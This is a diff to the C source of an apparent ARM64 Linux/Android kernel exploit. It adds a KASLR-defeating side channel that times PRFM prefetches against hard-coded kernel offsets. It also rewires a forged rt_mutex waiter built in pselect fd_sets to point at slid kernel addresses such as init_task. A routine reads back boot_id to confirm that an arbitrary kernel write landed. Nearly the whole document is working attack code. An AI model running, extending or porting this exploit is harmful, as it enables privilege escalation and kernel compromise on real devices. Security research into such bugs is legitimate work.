@@ -25,6 +25,102 @@ static atomic_int slide_consume_stop;
 static atomic_int slide_consume_sched_ok;
 static atomic_int slide_consume_last_sched_ret;
 static atomic_int slide_consume_last_sched_errno;
+static char slide_stock_bootid[64];
+static int slide_stock_bootid_len;
+
+/* ---------------- per-boot KASLR slide oracle (EL0 prefetch TLB timing) ----
+ * No KPTI on this SoC, so kernel mappings live in every user process's TTBR1
+ * tables. A burst of PRFM on one VA times ~5 when the page is TLB-resident
+ * vs 14-22 when every PRFM walks and fails. Cold-mapped pages are invisible
+ * (Cortex-A77 does not fill the TLB for permission-failing EL0 prefetches),
+ * but the image's first 2MB holds the exception vectors (+0x2000), which
+ * are hot on every timer interrupt. The image base is 2MB-aligned and lives
+ * inside the vmalloc region, so sweeping that region at 2MB steps finds
+ * exactly one candidate cluster; its first slot is the image base.
+ * Zero crash risk: PRFM is a non-faulting hint. (tools/prefetch_probe.c is
+ * the standalone twin of this code.) */
+static uint64_t slide_prefetch_time(uint64_t va)
+{
+    uint64_t best = ~0ULL;
+    for (int r = 0; r < 4; r++) {
+        uint64_t t0, t1;
+        asm volatile("isb\nmrs %0, cntvct_el0" : "=r"(t0));
+        for (int i = 0; i < 64; i++)
+            asm volatile("prfm pldl1keep, [%0]" :: "r"(va) : "memory");
+        asm volatile("isb\nmrs %0, cntvct_el0" : "=r"(t1));
+        if (t1 - t0 < best)
+            best = t1 - t0;
+    }
+    return best;
+}
+
+static uint64_t slide_oracle_find_slide(void)
+{
+    /* The image link base (0xffffff8008080000) is NOT 2MB-aligned — it sits
+     * 0x80000 into its 2MB block — and the slide is 2MB-aligned, so the
+     * runtime image base keeps that misalignment. The probe grid is
+     * link + SYS_CALL_TABLE_PAGE + s*2MB: sys_call_table is rodata read on
+     * every syscall, so its page is DTLB-hot on any active system. (A data
+     * prefetch is required: the exception-vectors page is instruction-only
+     * and stays cold in the DTLB on this split-TLB core.) Each probe tests
+     * exactly one slide hypothesis. */
+    const uint64_t link = KIMAGE_TEXT_BASE;
+    const uint64_t sct_page = 0x1980000ULL;  /* sys_call_table link page */
+    const uint64_t jif_page = 0x2b87000ULL;  /* jiffies link page, read every tick */
+    const uint64_t span = 0xffffffc000000000ULL - 0xffffff8000000000ULL;
+    int nslots = (int)(span >> 21);
+    uint64_t found = ~0ULL;
+    int hits = 0;
+    for (uint64_t s = 0; s < (uint64_t)nslots; s++) {
+        uint64_t t = slide_prefetch_time(link + sct_page + s * 0x200000ULL);
+        if (t < 10) {
+            /* candidate: module-region pages also light up, so require the
+             * jiffies page of the SAME hypothesis to be hot too */
+            uint64_t tj = slide_prefetch_time(link + jif_page + s * 0x200000ULL);
+            if (tj < 10) {
+                if (found == ~0ULL)
+                    found = s * 0x200000ULL;
+                hits++;
+            }
+        }
+    }
+    /* second pass to drop transient false positives */
+    if (found != ~0ULL) {
+        uint64_t t = slide_prefetch_time(link + sct_page + found);
+        if (t >= 10) {
+            pr_warning("slide oracle: candidate lost on re-probe, no slide\n");
+            return ~0ULL;
+        }
+    }
+    if (found == ~0ULL) {
+        pr_warning("slide oracle: no hot slot found\n");
+        return ~0ULL;
+    }
+    pr_success("slide oracle: slide=%016llx hot=%d recheck=%llu\n",
+               (unsigned long long)found, hits,
+               (unsigned long long)slide_prefetch_time(link + sct_page + found));
+    return found;
+}
+
+static void slide_capture_stock_bootid(void) {
+  int fd = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
+  if (fd < 0) {
+    slide_stock_bootid_len = -1;
+    return;
+  }
+  ssize_t n = read(fd, slide_stock_bootid, sizeof(slide_stock_bootid) - 1);
+  close(fd);
+  if (n <= 0) {
+    slide_stock_bootid_len = -1;
+    return;
+  }
+  slide_stock_bootid[n] = 0;
+  while (n > 0 && slide_stock_bootid[n - 1] == '\n') {
+    slide_stock_bootid[--n] = 0;
+  }
+  slide_stock_bootid_len = (int)n;
+  pr_info("slide stock boot_id captured len=%d\n", n);
+}
 
 int slide_pselect_words_per_set(void) {
   int bits_per_word = (int)(8 * sizeof(unsigned long));
@@ -94,10 +190,17 @@ void slide_pselect_put_waiter_word(
   }
 }
 
+static uint64_t slide_slide;   /* per-boot KASLR slide (prefetch oracle) */
+
 void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
   FD_ZERO(in);
   FD_ZERO(out);
   FD_ZERO(ex);
+
+  uint64_t loggers = SLIDE_LOGGERS_0_1_IMAGE + slide_slide;
+  uint64_t bootid_data = SLIDE_RANDOM_BOOT_ID_DATA_IMAGE + slide_slide;
+  uint64_t init_task = SLIDE_INIT_TASK_IMAGE + slide_slide;
+  uint64_t mirror_lock = SLIDE_MIRROR_LOCK_IMAGE + slide_slide;
 
   int words_per_set = slide_pselect_words_per_set();
   struct slide_waiter_word {
@@ -105,17 +208,17 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
     uint64_t value;
     const char *name;
   } words[] = {
-    {0, SLIDE_LOGGERS_0_1, "tree_pc"},
+    {0, loggers, "tree_pc"},
     {1, 0, "tree_right"},
-    {2, SLIDE_RANDOM_BOOT_ID_DATA, "tree_left"},
+    {2, bootid_data, "tree_left"},
     {3, FAKE_WAITER_PRIO, "tree_prio"},
-    {5, SLIDE_LOGGERS_0_1, "pi0"},
+    {5, loggers, "pi0"},
     {6, 0, "pi1"},
-    {7, SLIDE_RANDOM_BOOT_ID_DATA, "pi2"},
+    {7, bootid_data, "pi2"},
     {8, FAKE_WAITER_PRIO, "pi_prio"},
     {9, 0, "pi_deadline"},
-    {10, SLIDE_INIT_TASK, "task"},
-    {11, fake_lock, "lock"},
+    {10, init_task, "task"},
+    {11, mirror_lock, "lock"},
     {12, 3, "wake_state"},
     {13, 0, "ww_ctx"},
   };
@@ -364,24 +467,43 @@ uint64_t slide_read_stext(void) {
   for (int i = 0; i < 8; i++) {
     leaked |= (uint64_t)raw[i] << (i * 8);
   }
-  if ((leaked >> 48) != 0xffff) {
-    pr_warning("slide bad leaked pointer=%016llx\n",
-               (unsigned long long)leaked);
+  uint64_t leaked_hi = 0;
+  for (int i = 8; i < 16; i++) {
+    leaked_hi |= (uint64_t)raw[i] << ((i - 8) * 8);
+  }
+  pr_success("slide boot_id readback pid=%d q0=%016llx q1=%016llx\n",
+             getpid(), (unsigned long long)leaked,
+             (unsigned long long)leaked_hi);
+  /* The UUID dashes are print format, not content, so compare against the
+   * stock UUID captured before the gadget ran: a CHANGED readback proves
+   * the W1 write landed and we are reading kernel memory. */
+  if (slide_stock_bootid_len > 0 &&
+      strncmp(buf, slide_stock_bootid, (size_t)slide_stock_bootid_len) == 0) {
+    pr_warning("slide boot_id unchanged — write did not land\n");
     return 0;
   }
-
-  uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER);
-  uint64_t stext = leaked - off;
-  pr_success("slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx stext=%016llx\n",
-             getpid(), (unsigned long long)leaked, (unsigned long long)stext);
-  pr_success("slide boot_id-derived_stext pid=%d value=%016llx\n",
-             getpid(), (unsigned long long)stext);
-  return stext;
+  if ((leaked >> 48) == 0xffff) {
+    uint64_t stext = leaked - SLIDE_NFULNL_LOGGER_OFF;
+    pr_success("slide boot_id-derived_stext pid=%d value=%016llx stext=%016llx\n",
+               getpid(), (unsigned long long)leaked,
+               (unsigned long long)stext);
+    return stext;
+  }
+  if (leaked == 0 && leaked_hi == 0) {
+    pr_warning("slide write LANDED (readback all-zero); loggers[0][0] empty "
+               "at this slide\n");
+    return KIMAGE_TEXT_BASE + slide_slide;
+  }
+  pr_warning("slide readback is kernel memory but not a slid pointer "
+             "(slide nonzero?): q0=%016llx q1=%016llx\n",
+             (unsigned long long)leaked, (unsigned long long)leaked_hi);
+  return 0;
 }
 uint64_t slide_child_leak_stext(void) {
   pthread_t waiter;
   pthread_t owner;
   pthread_t consumer;
+  slide_capture_stock_bootid();
   SYSCHK(pthread_create(&waiter, NULL, slide_waiter_thread, NULL));
   SYSCHK(pthread_create(&owner, NULL, slide_owner_thread, NULL));
   SYSCHK(pthread_create(&consumer, NULL, slide_consumer_thread, NULL));
@@ -467,20 +589,28 @@ int slide_leak_kernel_base(void) {
   if (slide_leak_from_kallsyms() || slide_leak_from_dmesg()) {
     return 1;
   }
+  slide_slide = slide_oracle_find_slide();
+  if (slide_slide != ~0ULL) {
+    kaslr_base = KIMAGE_TEXT_BASE + slide_slide;
+    kaslr_slide = slide_slide;
+    pr_success("slide oracle set kaslr_base=%016llx slide=%016llx\n",
+               (unsigned long long)kaslr_base,
+               (unsigned long long)kaslr_slide);
+  }
 #ifdef CFGOPS_4_19_STYLE
   pr_warning("slide: bootid rb-gadget values derived for 4.19 "
              "(LOGGERS_0_1=%016llx RANDOM_BOOT_ID_DATA=%016llx)\n",
-             (unsigned long long)SLIDE_LOGGERS_0_1,
-             (unsigned long long)SLIDE_RANDOM_BOOT_ID_DATA);
+             (unsigned long long)(SLIDE_LOGGERS_0_1_IMAGE + slide_slide),
+             (unsigned long long)(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE + slide_slide));
 #endif
   for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
 #ifdef SLIDE_MIRROR_MODE
     /* z3q: the walk only dereferences fake_lock as an all-zero empty
-     * rt_mutex, so the KASLR-independent .bss direct-map alias stands in
-     * for the KernelSnitch-leaked payload page (see target.h). */
-    page_base = SLIDE_MIRROR_LOCK;
-    fake_lock = SLIDE_MIRROR_LOCK;
-    fake_w0 = SLIDE_MIRROR_LOCK + 0x100; /* guard-only value in slide mode */
+     * rt_mutex, so the .bss tail hole (slid along with the image) stands
+     * in for the KernelSnitch-leaked payload page (see target.h). */
+    page_base = SLIDE_MIRROR_LOCK_IMAGE + slide_slide;
+    fake_lock = SLIDE_MIRROR_LOCK_IMAGE + slide_slide;
+    fake_w0 = fake_lock + 0x100; /* guard-only value in slide mode */
     pr_info("slide mirror mode lock=%016zx\n", fake_lock);
 #else
     page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
